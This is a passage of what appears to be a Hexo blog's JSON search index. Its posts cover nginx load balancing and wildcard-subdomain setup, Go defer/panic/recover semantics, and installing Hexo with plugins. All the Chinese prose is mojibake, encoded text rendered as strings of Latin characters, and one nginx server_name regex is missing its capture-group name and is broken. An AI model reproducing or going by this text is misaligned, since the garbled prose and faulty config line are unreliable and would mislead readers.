socketï¼Œä¹Ÿå¯ä»¥æŒ‡å®šç«¯å£å·ã€‚\n\nupstreamè¿˜å¯ä»¥ä¸ºæ¯ä¸ªè®¾å¤‡è®¾ç½®çŠ¶æ€å€¼ï¼Œè¿™äº›çŠ¶æ€å€¼çš„å«ä¹‰åˆ†åˆ«å¦‚ä¸‹ï¼š\n\n+ down è¡¨ç¤ºå•å‰çš„serveræš‚æ—¶ä¸å‚ä¸è´Ÿè½½.\n\n+ weight é»˜è®¤ä¸º1.    weightè¶Šå¤§ï¼Œè´Ÿè½½çš„æƒé‡å°±è¶Šå¤§ã€‚\n\n+ max_fails ï¼šå…è®¸è¯·æ±‚å¤±è´¥çš„æ¬¡æ•°é»˜è®¤ä¸º1.å½“è¶…è¿‡æœ€å¤§æ¬¡æ•°æ—¶ï¼Œè¿”å›proxy_next_upstream æ¨¡å—å®šä¹‰çš„é”™è¯¯.\n\n+ fail_timeout : max_failsæ¬¡å¤±è´¥åï¼Œæš‚åœçš„æ—¶é—´ã€‚\n\n+ backupï¼š è¡¨ç¤ºå½“å‰serveræ˜¯å¤‡ç”¨æœåŠ¡å™¨ï¼Œåªæœ‰å…¶å®ƒébackupåç«¯æœåŠ¡å™¨éƒ½æŒ‚æ‰äº†æˆ–è€…å¾ˆå¿™æ‰ä¼šåˆ†é…åˆ°è¯·æ±‚ã€‚\n\n```nginx\nupstream bakend{ #å®šä¹‰è´Ÿè½½å‡è¡¡è®¾å¤‡çš„IpåŠè®¾å¤‡çŠ¶æ€ \n      ip_hash; \n      server 10.0.0.11:9090 down; \n      server 10.0.0.11:8080 weight=2; \n      server 10.0.0.11:6060; \n      server 10.0.0.11:7070 backup; \n}\n```\n\n##### 3.1 æ³¨æ„:\n\nmax_failså’Œfail_timeoutä¸€èˆ¬ä¼šå…³è”ä½¿ç”¨ï¼Œå¦‚æœæŸå°serveråœ¨fail_timeoutæ—¶é—´å†…å‡ºç°äº†max_failsæ¬¡è¿æ¥å¤±è´¥ï¼Œé‚£ä¹ˆNginxä¼šè®¤ä¸ºå…¶å·²ç»æŒ‚æ‰äº†ï¼Œä»è€Œåœ¨fail_timeoutæ—¶é—´å†…ä¸å†å»è¯·æ±‚å®ƒï¼Œfail_timeouté»˜è®¤æ˜¯10sï¼Œmax_failsé»˜è®¤æ˜¯1ï¼Œå³é»˜è®¤æƒ…å†µæ˜¯åªè¦å‘ç”Ÿé”™è¯¯å°±è®¤ä¸ºæœåŠ¡å™¨æŒ‚æ‰äº†ï¼Œå¦‚æœå°†max_failsè®¾ç½®ä¸º0ï¼Œåˆ™è¡¨ç¤ºå–æ¶ˆè¿™é¡¹æ£€æŸ¥ã€‚\n\n\n\n### 4. å®æˆ˜é…ç½®:\n\n````nginx\nupstream levonfly {\n    server 127.0.0.1:13050;\n}\n\nupstream testing-levonfly {\n    server 172.25.61.25:13050;\n}\n\n\nserver {\n    server_name levonfly.com;\n    listen 443 ssl http2 ;\n    access_log /var/log/nginx/cistern_access_log;\n    error_log /var/log/nginx/cistern_error_log notice;\n    ssl_certificate /etc/nginx/certs/STAR.levonfly.com.crt;\n    ssl_certificate_key /etc/nginx/certs/STAR.levonfly.com.key;\n    proxy_set_header       X-Real-IP $remote_addr;\n    proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header       X-Forwarded-Proto $scheme;\n    proxy_set_header       X-Scheme $scheme;\n    proxy_set_header       Host $http_host;\n    proxy_redirect         off;\n    proxy_intercept_errors on;\n\n    location / {\n        proxy_pass http://levonfly;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection $http_connection;\n        proxy_http_version 1.1;\n        chunked_transfer_encoding off;\n        proxy_buffering off;\n        proxy_cache off;\n    }\n}\n\nserver {\n    server_name test.levonfly.com;\n    listen 443 ssl http2 ;\n    access_log /var/log/nginx/cistern_access_log;\n    error_log /var/log/nginx/cistern_error_log notice;\n    ssl_certificate /etc/nginx/certs/STAR.levonfly.com.crt;\n    ssl_certificate_key /etc/nginx/certs/STAR.levonfly.com.key;\n    proxy_set_header       X-Real-IP $remote_addr;\n    proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header       X-Forwarded-Proto $scheme;\n    proxy_set_header       X-Scheme $scheme;\n    proxy_set_header       Host $http_host;\n    proxy_redirect         off;\n    proxy_intercept_errors on;\n\n    location / {\n        proxy_pass http://testing-levonfly;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection $http_connection;\n        proxy_http_version 1.1;\n        chunked_transfer_encoding off;\n        proxy_buffering off;\n        proxy_cache off;\n    }\n}\n````\n\n##### 4.1 é‡åˆ°çš„é—®é¢˜:\n\n å¦‚æœä¸ç”Ÿæ•ˆ, æ³¨æ„ä¸‹ upstream çš„ç¼©è¿›ä¼šé€ æˆé—®é¢˜\n\n\n\n### 5. å‚è€ƒèµ„æ–™\n\n+ http://www.linuxe.cn/post-182.html\n\n+ https://www.cnblogs.com/wzjhoutai/p/6932007.html\n\n","tags":["nginx"],"categories":["nginx"]},{"title":"nginxæ³›åŸŸåè§£æå®æˆ˜","url":"%2Fp%2Fd039.html","content":"\n\n\n### 1. åŸŸåæ¦‚å¿µ\n\n##### 1.1 äºŒçº§åŸŸå\n\näºŒçº§åŸŸåæ˜¯æŒ‡é¡¶çº§åŸŸåä¹‹ä¸‹çš„åŸŸå, è§ä¸‹é¢çš„ä¾‹å­:\n\n- .com é¡¶çº§åŸŸå\n  - liuvv.com ä¸€çº§åŸŸå(ä½ èŠ±é’±ç”³è¯·çš„)\n    - www.liuvv.com äºŒçº§åŸŸå\n    - blog.liuvv.com äºŒçº§åŸŸå\n    - ä¾æ¬¡ç±»æ¨...\n\næœ‰å‡ ç‚¹éœ€è¦æ³¨æ„ä¸‹:\n\n1. www.liuvv.comæ˜¯å±äºäºŒçº§åŸŸå,ä¸è¿‡ä¸€èˆ¬æˆ‘ä»¬æŠŠè¿™ä¸ªåŸŸåé…ç½®æŒ‡å‘ä¸€çº§åŸŸåè®¿é—®.\n2. www.liuvv.com/newsè¿™ç§å½¢å¼ä¸€èˆ¬ç§°ä¹‹ä¸ºç½‘ç«™çš„å­é¡µé¢å­ç›®å½•ç­‰,å¹¶ä¸æ˜¯äºŒçº§åŸŸå.\n3. å¦å¤–ç±»ä¼¼.com.cn, .net.cn, .org.cnè¿™ç§ç§°ä¹‹ä¸ºäºŒçº§åŸŸ.\n\n##### 1.2 åŸŸåæ³›è§£æ\n\næˆ‘ä»¬çš„ç›®çš„æ˜¯å®ç°è®¿é—®äºŒçº§åŸŸååè½¬å‘è¯·æ±‚.é¦–å…ˆè¦å®ç°çš„æ˜¯äºŒçº§åŸŸåçš„é…ç½®,ä¸€èˆ¬ä½¿ç”¨Nginxæ³›è§£ææ¥å¤„ç†. æ³›è§£æå³åˆ©ç”¨é€šé…ç¬¦*æ¥åšæ¬¡çº§åŸŸåä»¥å®ç°æ‰€æœ‰çš„æ¬¡çº§åŸŸåå‡æŒ‡å‘åŒä¸€IPåœ°å€ã€‚\n\næ³›è§£æçš„ç”¨é€”æœ‰:\n\n1. å¯ä»¥è®©åŸŸåæ”¯æŒæ— é™çš„å­åŸŸå(è¿™ä¹Ÿæ˜¯æ³›åŸŸåè§£ææœ€å¤§çš„ç”¨é€”)ã€‚\n2. é˜²æ­¢ç”¨æˆ·é”™è¯¯è¾“å…¥å¯¼è‡´çš„ç½‘ç«™ä¸èƒ½è®¿é—®çš„é—®é¢˜ã€‚\n3. å¯ä»¥è®©ç›´æ¥è¾“å…¥ç½‘å€ç™»é™†ç½‘ç«™çš„ç”¨æˆ·è¾“å…¥ç®€æ´çš„ç½‘å€å³å¯è®¿é—®ç½‘ç«™ã€‚\n\n<!-- more -->\n\n##### 1.3 åŸŸåç±»å‹\n\n![1](nginxæ³›åŸŸåè§£æå®æˆ˜/5.png)\n\n+ æ— è®ºè®°å½•ç±»å‹ä¸ºå•¥, ä¸»æœºè®°å½•éƒ½å¡«å†™ xxxxx.liuvv.com\n+ ä¸»æœºè®°å½•å°±æ˜¯åŸŸåå‰ç¼€ï¼Œå¸¸è§ç”¨æ³•æœ‰ï¼š\n  + wwwï¼šè§£æåçš„åŸŸåä¸º `www.liuvv.com`\n  + @ï¼šç›´æ¥è§£æä¸»åŸŸå `liuvv.com`\n  + \\*ï¼šæ³›è§£æï¼ŒåŒ¹é…å…¶ä»–æ‰€æœ‰åŸŸå `*.liuvv.com`\n  \n+ è®°å½•ç±»å‹çš„å«ä¹‰æ˜¯ä»€ä¹ˆï¼Ÿ\n\n  + **A è®°å½•ï¼š**åœ°å€è®°å½•ï¼Œç”¨æ¥æŒ‡å®šåŸŸåçš„ IPv4 åœ°å€ï¼ˆä¾‹å¦‚`8.8.8.8`ï¼‰ï¼Œå¦‚æœéœ€è¦å°†åŸŸåæŒ‡å‘ä¸€ä¸ª IP åœ°å€ï¼Œå°±éœ€è¦æ·»åŠ  A è®°å½•ã€‚\n\n  + **CNAME è®°å½•ï¼š** å¦‚æœéœ€è¦å°†åŸŸåæŒ‡å‘å¦ä¸€ä¸ªåŸŸåï¼Œå†ç”±å¦ä¸€ä¸ªåŸŸåæä¾› IP åœ°å€ï¼Œå°±éœ€è¦æ·»åŠ  CNAME è®°å½•ã€‚(github page å°±æ˜¯ç”¨çš„è¿™ç§)\n\n  + **NS è®°å½•ï¼š**åŸŸåæœåŠ¡å™¨è®°å½•ï¼Œå¦‚æœéœ€è¦æŠŠå­åŸŸåäº¤ç»™å…¶ä»– DNS æœåŠ¡å•†è§£æï¼Œå°±éœ€è¦æ·»åŠ  NS è®°å½•ã€‚\n\n  + **AAAA è®°å½•ï¼š**ç”¨æ¥æŒ‡å®šä¸»æœºåï¼ˆæˆ–åŸŸåï¼‰å¯¹åº”çš„ IPv6 åœ°å€ï¼ˆä¾‹å¦‚ `ff06:0:0:0:0:0:0:c3`ï¼‰è®°å½•ã€‚\n\n  + **MX è®°å½•ï¼š**å¦‚æœéœ€è¦è®¾ç½®é‚®ç®±ï¼Œè®©é‚®ç®±èƒ½æ”¶åˆ°é‚®ä»¶ï¼Œå°±éœ€è¦æ·»åŠ  MX è®°å½•ã€‚\n\n  + **TXT è®°å½•ï¼š**å¦‚æœå¸Œæœ›å¯¹åŸŸåè¿›è¡Œæ ‡è¯†å’Œè¯´æ˜ï¼Œå¯ä»¥ä½¿ç”¨ TXT è®°å½•ï¼Œç»å¤§å¤šæ•°çš„ TXT è®°å½•æ˜¯ç”¨æ¥åš SPF è®°å½•ï¼ˆååƒåœ¾é‚®ä»¶ï¼‰ã€‚\n\n  + **SRV è®°å½•ï¼š**SRV è®°å½•ç”¨æ¥æ ‡è¯†æŸå°æœåŠ¡å™¨ä½¿ç”¨äº†æŸä¸ªæœåŠ¡ï¼Œå¸¸è§äºå¾®è½¯ç³»ç»Ÿçš„ç›®å½•ç®¡ç†ã€‚ä¸»æœºè®°å½•å¤„æ ¼å¼ä¸ºï¼šæœåŠ¡çš„åå­—.åè®®çš„ç±»å‹ã€‚ä¾‹å¦‚ï¼š `_sip._tcp`ã€‚\n\n  + **éšã€æ˜¾æ€§ URL è®°å½•ï¼š**å°†ä¸€ä¸ªåŸŸåæŒ‡å‘å¦å¤–ä¸€ä¸ªå·²ç»å­˜åœ¨çš„ç«™ç‚¹ï¼Œå°±éœ€è¦æ·»åŠ  URL è®°å½•ã€‚\n\n\n+ è®°å½•å€¼å¦‚ä½•å¡«å†™ï¼Ÿ\n\n  + **A è®°å½•ï¼š**å¡«å†™æ‚¨æœåŠ¡å™¨ IPï¼Œå¦‚æœæ‚¨ä¸çŸ¥é“ï¼Œè¯·å’¨è¯¢æ‚¨çš„ç©ºé—´å•†ã€‚\n\n  + **CNAME è®°å½•ï¼š**å¡«å†™ç©ºé—´å•†ç»™æ‚¨æä¾›çš„åŸŸåï¼Œä¾‹å¦‚ï¼š`2.com`ã€‚\n\n  + **MX è®°å½•ï¼š**å¡«å†™æ‚¨é‚®ä»¶æœåŠ¡å™¨çš„ IP åœ°å€æˆ–ä¼ä¸šé‚®ç®±ç»™æ‚¨æä¾›çš„åŸŸåï¼Œå¦‚æœæ‚¨ä¸çŸ¥é“ï¼Œè¯·å’¨è¯¢æ‚¨çš„é‚®ä»¶æœåŠ¡æä¾›å•†ã€‚\n\n  + **AAAA è®°å½•ï¼š**ä¸å¸¸ç”¨ï¼Œè§£æåˆ° IPv6 çš„åœ°å€ã€‚\n\n  + **NSè®°å½•ï¼š**ä¸å¸¸ç”¨ï¼Œç³»ç»Ÿé»˜è®¤æ·»åŠ çš„ä¸¤ä¸ª NS è®°å½•è¯·ä¸è¦ä¿®æ”¹ã€‚NS å‘ä¸‹æˆæƒï¼Œå¡«å†™ DNS åŸŸåï¼Œä¾‹å¦‚ï¼š`ns3.dnsv3.com`ã€‚\n\n  + **TXT è®°å½•ï¼š**è®°å½•å€¼å¹¶æ²¡æœ‰å›ºå®šçš„æ ¼å¼ï¼Œä¸è¿‡å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼ŒTXT è®°å½•æ˜¯ç”¨æ¥åš SPF ååƒåœ¾é‚®ä»¶çš„ã€‚æœ€å…¸å‹çš„ SPF æ ¼å¼çš„ TXT è®°å½•ä¾‹å­ä¸º â€œ`v=spf1 a mx ~all`â€ï¼Œè¡¨ç¤ºåªæœ‰è¿™ä¸ªåŸŸåçš„ A è®°å½•å’Œ MX è®°å½•ä¸­çš„ IP åœ°å€æœ‰æƒé™ä½¿ç”¨è¿™ä¸ªåŸŸåå‘é€é‚®ä»¶ã€‚\n\n  + **SRV è®°å½•ï¼š**è®°å½•å€¼æ ¼å¼ä¸ºï¼šä¼˜å…ˆçº§ æƒé‡ ç«¯å£ ä¸»æœºåã€‚ä¾‹å¦‚ï¼š`0 5 5060 sipserver.example.com` ã€‚\n\n  + **éšã€æ˜¾æ€§ URL è®°å½•ï¼š**è®°å½•å€¼ä¸ºå¿…é¡»ä¸ºæ•´çš„åœ°å€ï¼ˆå¿…é¡»å¸¦æœ‰åè®®ã€åŸŸåï¼Œå¯ä»¥åŒ…å«ç«¯å£å·å’Œèµ„æºå®šä½ç¬¦ï¼‰ã€‚\n\n+ TTLå¦‚ä½•å¡«å†™\n\n  TTLå³ Time To Liveï¼Œç¼“å­˜çš„ç”Ÿå­˜æ—¶é—´ã€‚æŒ‡åœ°æ–¹ DNS ç¼“å­˜æ‚¨åŸŸåè®°å½•ä¿¡æ¯çš„æ—¶é—´ï¼Œç¼“å­˜å¤±æ•ˆåä¼šå†æ¬¡åˆ° DNSPod è·å–è®°å½•å€¼ã€‚æˆ‘ä»¬é»˜è®¤çš„ 600 ç§’æ˜¯æœ€å¸¸ç”¨çš„ï¼Œä¸ç”¨ä¿®æ”¹ã€‚\n\n  - 600ï¼ˆ10åˆ†é’Ÿï¼‰ï¼šå»ºè®®æ­£å¸¸æƒ…å†µä¸‹ä½¿ç”¨ 600ã€‚\n\n  - 60ï¼ˆ1åˆ†é’Ÿï¼‰ï¼šå¦‚æœæ‚¨ç»å¸¸ä¿®æ”¹ IPï¼Œä¿®æ”¹è®°å½•ä¸€åˆ†é’Ÿå³å¯ç”Ÿæ•ˆã€‚é•¿æœŸä½¿ç”¨ 60ï¼Œè§£æé€Ÿåº¦ä¼šç•¥å—å½±å“ã€‚\n\n  - 3600ï¼ˆ1 å°æ—¶ï¼‰ï¼šå¦‚æœæ‚¨ IP æå°‘å˜åŠ¨ï¼ˆä¸€å¹´å‡ æ¬¡ï¼‰ï¼Œå»ºè®®é€‰æ‹© 3600ï¼Œè§£æé€Ÿåº¦å¿«ã€‚å¦‚æœè¦ä¿®æ”¹ IPï¼Œæå‰ä¸€å¤©æ”¹ä¸º 60ï¼Œå³å¯å¿«é€Ÿç”Ÿæ•ˆã€‚\n\n    \n\n\n### 2. åŸŸåé…ç½®\n\n##### 2.1 é…ç½®æ³›è§£æ\n\nå»åŸŸåæä¾›å•†é‚£é‡Œå…ˆé…ç½®ä¸€ä¸ªæ³›è§£æåœ°å€,è®°å½•ç±»å‹ä¸ºA.åŸŸåæŒ‡å‘ä¸€ä¸ªIPv4åœ°å€.ä¸»æœºè®°å½•è®¾ç½®ä¸º*.è®°å½•å€¼å¡«å†™æœåŠ¡å™¨å…¬ç½‘Ipåœ°å€.\n\né…ç½®å¥½åç¨å¾®ç­‰å¾…ä¸€ä¸‹,ç„¶åè®¿é—®è¿™ä¸ªåŸŸå.å¯ä»¥éšæ„è¾“å…¥ä»»ä½•äºŒçº§åŸŸå,è®¿é—®åˆ°çš„éƒ½åº”è¯¥æ˜¯é¡¶çº§åŸŸåçš„å†…å®¹.æˆ‘è¿™é‡Œè®¿é—®ç»“æœæ€»æ˜¯Nginxçš„é»˜è®¤é¡µé¢.\n\n![1](nginxæ³›åŸŸåè§£æå®æˆ˜/2.png)\n\n\n\n##### 2.2 nginx server_name\n\nnginx httpæ¨¡å— serveræ¨¡å—çš„ `server_name`æŒ‡ä»¤ä¸»è¦ç”¨äºé…ç½®åŸºäºåç§°çš„è™šæ‹Ÿä¸»æœº.åŒ¹é…é¡ºåºä¸åŒç»“æœä¸åŒ.\n\na. ç²¾å‡†çš„server_nameé…ç½®,å¦‚:\n\n```\nserver_name liuvv.com www.liuvv.com;\n```\n\nb. ä»¥é€šé…ç¬¦*å¼€å§‹çš„å­—ç¬¦ä¸²:\n\n```\nserver_name *.liuvv.com;\n```\n\nc. ä»¥é€šé…ç¬¦*ç»“æŸçš„å­—ç¬¦ä¸²:\n\n```\nserver_name www.*;\n```\n\nd. é…ç½®æ­£åˆ™è¡¨è¾¾å¼:\n\n```\nserver_name ~^(?.+)\\.liuvv\\.com$;\n```\n\nåŒ¹é…é¡ºåºç”±ä¸Šè‡³ä¸‹,åªè¦æœ‰ä¸€é¡¹åŒ¹é…ä»¥åå°±ä¼šåœæ­¢æœç´¢.ä½¿ç”¨æ—¶è¦æ³¨æ„è¿™ä¸ªé¡ºåº\n\n\n\n##### 2.3 ç»‘å®šå­åŸŸååˆ°ä¸åŒç›®å½•\n\né€šè¿‡åŒ¹é…subdomain, åœ¨ä¸‹é¢çš„å¯ä»¥é€šè¿‡$subdomainè¿™ä¸ªå˜é‡è·å–å½“å‰å­åŸŸåç§°ã€‚\n\n```nginx\nserver {\n        listen 80 default_server;\n        listen [::]:80 default_server;\n\n        server_name  ~^(?<subdomain>.+)\\.liuvv\\.com$;\n        root /home/levonfly/www/$subdomain;\n        index index.html;\n\n        location / {\n                try_files $uri $uri/ =404;\n        }\n\n}\n```\n\n\n\n\n![1](nginxæ³›åŸŸåè§£æå®æˆ˜/3.png)\n\n\n\n![1](nginxæ³›åŸŸåè§£æå®æˆ˜/4.png)\n\n\n\n##### 2.4 ç»‘å®šå­åŸŸååˆ°ä¸åŒç›®å½•(å¤šä¸ªé…ç½®æ–‡ä»¶)\n\n![1](nginxæ³›åŸŸåè§£æå®æˆ˜/6.png)\n\n\n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ [Nginx æ³›è§£æé…ç½®è¯·æ±‚æ˜ å°„åˆ°å¤šç«¯å£å®ç°äºŒçº§åŸŸåè®¿é—®](https://www.cnblogs.com/summit7ca/p/6974215.html)\n+ http://www.ruanyifeng.com/blog/2016/06/dns.html\n+ https://cloud.tencent.com/document/product/302/3468","tags":["nginx"],"categories":["nginx"]},{"title":"golangçš„defer_panic_recoverç‰¹æ€§","url":"%2Fp%2Fc0441565.html","content":"\næ¯æ¬¡éƒ½è¢« `defer`,`panic`å’Œ`recover` å‘çš„æ­»å»æ´»æ¥ï¼Œä»Šå¤©æŠ½å‡ºæ—¶é—´æ¥æ•´ç†ä¸€ä¸‹ã€‚\n\n<!-- more -->\n\n# 1. defer\n\n### 1.1 åŒ¿åå’Œæœ‰åè¿”å›å€¼ï¼ˆdeferèƒ½æ”¹æœ‰åï¼‰\n\n+ å¦‚æœæ˜¯åŒ¿åè¿”å›å€¼ï¼Œæ‰§è¡ŒReturnè¯­å¥åï¼ŒGoä¼šåˆ›å»ºä¸€ä¸ªä¸´æ—¶å˜é‡ä¿å­˜è¿”å›å€¼ã€‚\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tfmt.Println(\"a return:\", a())\n}\n\nfunc a() int {\n\tvar i int //deferæ”¹çš„è¿™ä¸ªå€¼,ä¸æ˜¯è¿”å›å€¼\n\tdefer func() {\n\t\ti++\n\t\tfmt.Println(\"a defer2:\", i)\n\t}()\n  \n\tdefer func() {\n\t\ti++\n\t\tfmt.Println(\"a defer1:\", i)\n\t}()\n  \n\treturn i\n}\n\n// æ‰“å°ç»“æœä¸º a defer1: 1\n// æ‰“å°ç»“æœä¸º a defer2: 2\n// æ‰“å°ç»“æœä¸º a return: 0\n```\n\n+ æœ‰åè¿”å›å€¼ï¼Œdeferèƒ½çœ‹åˆ°\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tfmt.Println(\"b return:\", b())\n}\n\nfunc b() (i int) {\n\tdefer func() {\n\t\ti++\n\t\tfmt.Println(\"b defer2:\", i)\n\t}()\n\tdefer func() {\n\t\ti++\n\t\tfmt.Println(\"b defer1:\", i)\n\t}()\n\treturn i // æˆ–è€…ç›´æ¥ return æ•ˆæœç›¸åŒ\n}\n\n// æ‰“å°ç»“æœä¸º b defer1: 1\n// æ‰“å°ç»“æœä¸º b defer2: 2\n// æ‰“å°ç»“æœä¸º b return: 2\n```\n\n### 1.2 defer å‚æ•°ä¼šæå‰ç®—\n\ndeferå£°æ˜æ—¶ä¼šå…ˆè®¡ç®—ç¡®å®šå‚æ•°çš„å€¼ï¼Œdeferæ¨è¿Ÿæ‰§è¡Œçš„ä»…æ˜¯å…¶å‡½æ•°ä½“ã€‚\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tdefer P(time.Now())\n\ttime.Sleep(1e9) // 1s\n\tfmt.Println(\"1\", time.Now())\n}\nfunc P(t time.Time) {\n\tfmt.Println(\"2\", t) // æ­¤å¤„è¿˜æ˜¯è€çš„å€¼\n\tfmt.Println(\"3\", time.Now())\n}\n\n/*\n1 2020-06-30 20:27:58.893326\n2 2020-06-30 20:27:57.892902\n3 2020-06-30 20:27:58.89402\n*/\n\n```\n\n### 1.3 è°ƒç”¨os.Exitä¸ä¼šæ‰§è¡Œdefer\n\nå½“å‘ç”Ÿpanicæ—¶ï¼Œæ‰€åœ¨goroutineçš„æ‰€æœ‰deferä¼šè¢«æ‰§è¡Œï¼Œä½†æ˜¯å½“è°ƒç”¨os.Exit()æ–¹æ³•é€€å‡ºç¨‹åºæ—¶ï¼Œdeferå¹¶ä¸ä¼šè¢«æ‰§è¡Œã€‚\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc deferExit() {\n\tdefer func() {\n\t\tfmt.Println(\"defer\")\n\t}()\n\tos.Exit(0)\n}\nfunc main() {\n\tdeferExit() // ä»€ä¹ˆä¹Ÿä¸è¾“å‡º\n}\n```\n\n\n\n### 1.4 deferé¢è¯•é¢˜\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc DeferFunc1(i int) (t int) {//4\n    t = i\n    defer func() {\n        t += 3\n    }()\n    return t\n}\n\nfunc DeferFunc2(i int) int {// 1\n    t := i\n    defer func() {\n        t += 3\n    }()\n    return t\n}\n\nfunc DeferFunc3(i int) (t int) {// 3\n    defer func() {\n        t += i\n    }()\n    return 2\n}\n\nfunc DeferFunc4() (t int) {\n    defer func(i int) {\n        fmt.Println(i)\n        fmt.Println(t)\n    }(t)\n    t = 1\n    return 2\n}\n\nfunc main() {\n    fmt.Println(DeferFunc1(1))  // 4\n    fmt.Println(DeferFunc2(1))  // 1\n    fmt.Println(DeferFunc3(1)) // 3\n    DeferFunc4()  // 0 2\n}\n```\n\næ‰§è¡Œé¡ºåºåº”è¯¥æ˜¯ï¼š1. returnæœ€å…ˆç»™è¿”å›å€¼èµ‹å€¼ï¼ˆæœ‰åè¿”å›å€¼ç›´æ¥èµ‹å€¼ï¼ŒåŒ¿åè¿”å›å€¼åˆ™å…ˆå£°æ˜å†èµ‹å€¼)ï¼›2. æ¥ç€deferå¼€å§‹æ‰§è¡Œä¸€äº›æ”¶å°¾å·¥ä½œï¼›3. æœ€åRETæŒ‡ä»¤æºå¸¦è¿”å›å€¼é€€å‡ºå‡½æ•°ã€‚\n\n# 2. panic\n\n### 2.1 æˆªè· panic\n\n+ defer å’Œ recover é…åˆ, å¹¶ä¸”å…ˆå£°æ˜defer\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tdefer func() { // å¿…é¡»è¦å…ˆå£°æ˜deferï¼Œå¦åˆ™ä¸èƒ½æ•è·åˆ°panicå¼‚å¸¸\n\t\tfmt.Println(\"a\")\n\t\tif err := recover(); err != nil {\n\t\t\tfmt.Println(err)\n\t\t}\n\t\tfmt.Println(\"b\")\n\t}()\n\n\tpanic(\"å¼‚å¸¸ä¿¡æ¯\")\n\n\tfmt.Println(\"c\")\n}\n\n/*\na\nå¼‚å¸¸ä¿¡æ¯\nb\n*/\n```\n\n\n\n### 2.2 panic ä¼ é€’\n\npanic ä¼šä¸€ç›´ä¼ é€’, å¯¼è‡´ä¸» gorouting å¥”æºƒ\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc testPanic2() {\n\tpanic(\"testPanic panic2\")\n}\n\nfunc testPanic1() {\n\tgo testPanic2()\n}\n\nfunc main() {\n\tfmt.Println(\"begin\")\n\tgo testPanic1()\n\tfor {\n\t\ttime.Sleep(time.Second)\n\t}\n}\n\n\n/*\nbegin\npanic: testPanic panic2\n\ngoroutine 5 [running]:\nmain.testPanic2()\n*/\n```\n\n# 3. recover\n\n### 3.1 æˆªè· panic åªèƒ½åœ¨ä¸€ä¸ªå±‚\n\nå¤–å±‚çš„ recover èƒ½æ•æ‰é‡Œå±‚çš„ panicå—?  ä¸èƒ½\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tdefer func() {\n\t\tif err := recover(); err != nil {\n\t\t\tfmt.Println(err)\n\t\t}\n\t}()\n\n\tgo func() {\n\t\tpanic(\"falut1\")\n\t}()\n\n\ttime.Sleep(time.Second)\n}\n\n/*\npanic: falut1\n\ngoroutine 18 [running]:\nmain.main.func2()\n        /Users/liuwei/golang/src/golangTest/suanfa/main.go:16 +0x39\ncreated by main.main\n        /Users/liuwei/golang/src/golangTest/suanfa/main.go:15 +0x71\nexit status 2\n*/\n```\n\n","tags":["golang"],"categories":["1_golangåŸºç¡€"]},{"title":"hexoåšå®¢ç³»ç»Ÿçš„å®‰è£…å’Œè‡ªåŠ¨éƒ¨ç½²","url":"%2Fp%2Fd7a24ac4.html","content":"\n# 1. å®‰è£…\n\n### 1.1 åˆå§‹åŒ–\n\n```bash\nmkdir dohttp && cd dohttp\nhexo init\ngit init\ngit remote add origin git@github.com:unix2dos/dohttp.git\ngit push --set-upstream origin main\n```\n\n<!-- more -->\n\n+ vi  .gitignore\n\n```ini\n.DS_Store\nThumbs.db\ndb.json\n*.log\nnode_modules/\n```\n\n### 1.2 ä¸»é¢˜\n\n```bash\ngit submodule add https://github.com/theme-next/hexo-theme-next themes/next\n\ncat themes/next/_config.yml >> _config.yml\n\nmv _config.yml source/_data/next.yml\nvi source/_data/next.yml\n#theme:next\n```\n\n### 1.3 å¼€å§‹\n\n```bash\nhexo new post hello  \n\n# éšä¾¿å†™ç‚¹ä¸œè¥¿, http://localhost:4000/\nhexo server --config source/_data/next.yml\n```\n\n### 1.4 åˆ†ç±»å’Œæ ‡ç­¾\n\n+ æ ‡ç­¾\n\n```bash\nhexo new page tags\n\nvi source/tags/index.md\ntitle: æ ‡ç­¾\ndate: 2014-12-22 12:39:04\ntype: \"tags\"\ncomments: false\n---\n```\n\n\n\n+ åˆ†ç±»\n\n```bassh\nhexo new page categories\n\nvi source/categories/index.md\ntitle: åˆ†ç±»\ndate: 2014-12-22 12:39:04\ntype: \"categories\"\ncomments: false\n---\n```\n\n\n\n### 1.5 ä¸»é¡µmenu\n\n+ å›¾æ ‡\n\n  https://fontawesome.com/\n\n  https://www.flaticon.com/\n\n+ iconç”Ÿæˆ\n\n  https://realfavicongenerator.net/\n\n+ é…ç½®\n\n```yml\nmenu:\n  home: / || fa fa-home\n  Life: /categories/life || fas fa-feather\n  Note: /categories/note || fas fa-horse-head\n  Study: /categories/study || fas fa-dragon\n```\n\n\n\n# 2. æ’ä»¶\n\n### 2.1 æŒä¹…é“¾æ¥\n\n```bash\nnpm install hexo-abbrlink --save\n```\n\n+ config\n\n  ```yml\n  permalink: post/:abbrlink.html\n  abbrlink:\n    alg: crc16 #support crc16(default) and crc32\n    rep: hex    #support dec(default) and hex\n  ```\n\n\n\n### 2.2 å›¾ç‰‡ç›¸å¯¹è·¯å¾„\n\n```bash\nnpm install hexo-asset-image --save\n```\n\n+ config\n\n  ```yml\n  post_asset_folder: true\n  ```\n\n  \n\n### 2.3 æœ¬åœ°æœç´¢\n\n```bash\nnpm install hexo-generator-searchdb --save \n```\n\n+ config\n\n  ```yml\n  local_search:\n  \tenable: true  \n  ```\n\n  \n\n### 2.4 è‡ªåŠ¨åˆ†ç±»\n\n```bash\nnpm install hexo-auto-category --save\n```\n\n+ config\n\n  ```yml\n  auto_category:\n   enable: true\n   depth:\n  ```\n\n\n\n\n### 2.5 è‡ªå®šä¹‰ä¸»é¡µ\n\n1. npm remove hexo-generator-index\n2. Add `index.md` to `source` folder.\n\n\n\n# 3. éƒ¨ç½²\n\n### 3.1 